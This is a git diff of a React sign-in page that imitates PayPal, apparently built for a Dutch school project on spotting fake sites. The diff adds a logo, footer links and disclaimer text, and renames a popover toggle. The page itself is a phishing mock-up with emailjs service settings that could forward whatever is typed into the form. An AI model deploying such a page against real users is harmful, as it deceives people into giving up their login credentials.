@@ -2,6 +2,7 @@ import React, { useState } from "react";
 import emailjs from "emailjs-com";
 import { Popover, PopoverHeader, PopoverBody } from "reactstrap";
 import "./SignIn.css";
+import moller_logo from "../../assets/moller_logo.png";
 
 function SignIn() {
   const logo = "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg";
@@ -10,7 +11,7 @@ function SignIn() {
   const [password, setPassword] = useState("");
   const [popoverOpen, setPopoverOpen] = useState(false);
 
-  const toggle = () => setPopoverOpen(!popoverOpen);
+  const togglePopover = () => setPopoverOpen(!popoverOpen);
 
   const service_id = "service_r10yy1p";
   const template_id = "template_6tbtipc";
@@ -62,25 +63,30 @@ function SignIn() {
           <button className="signIn__openAcount">Rekening openen</button>
         </div>
       </div>
+      <img className="signIn__mollerLogo" src={moller_logo} alt="" />
       <div>
         <Popover
           trigger="legacy"
           placement="top"
           isOpen={popoverOpen}
           target="disclaimer"
-          toggle={toggle}
+          toggle={togglePopover}
           className="popover"
         >
           <PopoverHeader className="popover__header">Disclaimer</PopoverHeader>
           <PopoverBody className="popover__body">
             This website is part of our school project. There are no intentions
-            of real scamming. Submited data will not be saved.
+            of real scamming. Submited data will not be saved. - NLT Echt of
+            Vals
           </PopoverBody>
         </Popover>
       </div>
       <div className="signIn__footer">
         <div className="signIn__footerItems">
           <p className="signIn__footerItem">Contact</p>
+          <p className="signIn__footerItem">Privacy</p>
+          <p className="signIn__footerItem">Juridisch</p>
+          <p className="signIn__footerItem">Wereldwijd</p>
           <p className="signIn__footerItem disclaimer" id="disclaimer">
             Disclaimer
           </p>
